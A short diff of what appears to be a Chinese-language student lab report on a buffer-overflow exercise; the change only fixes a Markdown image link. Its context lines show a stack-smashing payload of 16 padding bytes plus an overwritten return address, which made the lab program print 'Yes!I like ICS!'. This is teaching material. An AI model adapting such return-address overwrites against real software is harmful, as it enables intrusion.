@@ -26,7 +26,7 @@ padding = b"A" * 16
 func1_addr = b"\x16\x12\x40\x00\x00\x00\x00\x00"
 payload = padding + func1_addr
 实验结果
-[alt text](c0af0d501fbd6ead6573231223e6eb4.png)
+![alt text](c0af0d501fbd6ead6573231223e6eb4.png)
 https://path/to/problem1_screenshot.png
 成功输出 "Yes!I like ICS!"
 
